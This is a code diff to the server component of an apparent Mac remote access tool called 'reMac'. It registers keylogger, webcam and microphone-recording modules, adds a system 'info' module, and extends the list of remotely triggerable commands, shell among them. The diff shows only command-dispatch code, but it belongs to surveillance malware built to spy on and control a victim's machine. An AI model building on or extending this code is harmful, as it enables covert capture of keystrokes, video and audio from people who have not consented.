@@ -13,6 +13,7 @@ from modules import mod_webcam
 from modules import mod_keylogger
 from modules import mod_recmic
 from modules import mod_modHelp
+from modules import mod_info
 
 from apps.libs.reMac_libbase import reMac_libbase
 
@@ -27,7 +28,8 @@ reMacModules = {
     'wc': [mod_webcam.mod_webcam(), 'webcam', 'Call webcam module', 'wc'],
     'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module', 'kl'],
     'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm <seconds to record>'],
-    'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>']
+    'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>'],
+    'in': [mod_info.mod_info(), 'info', 'Call info module', 'in']
 }
 
 
@@ -83,6 +85,7 @@ class reMac_libserver(reMac_libbase):
                 or input == "sc" \
                 or input == "wc" \
                 or input == "rm" \
+                or input == "in" \
                 or input == "d":  # or input == "help":
             return reMacModules[input][0].run_mod()
         elif input.startswith("mh"):
@@ -96,7 +99,12 @@ class reMac_libserver(reMac_libbase):
         if action == "hw" \
                 or action == "cb" \
                 or action == "ch" \
+                or action == "cl" \
+                or action == "sh" \
+                or action == "sc" \
+                or action == "wc" \
                 or action == "rm" \
+                or action == "in" \
                 or action.startswith("mh"):
             answer = self.processInput(action)
             content = {"action": action, "result": answer}
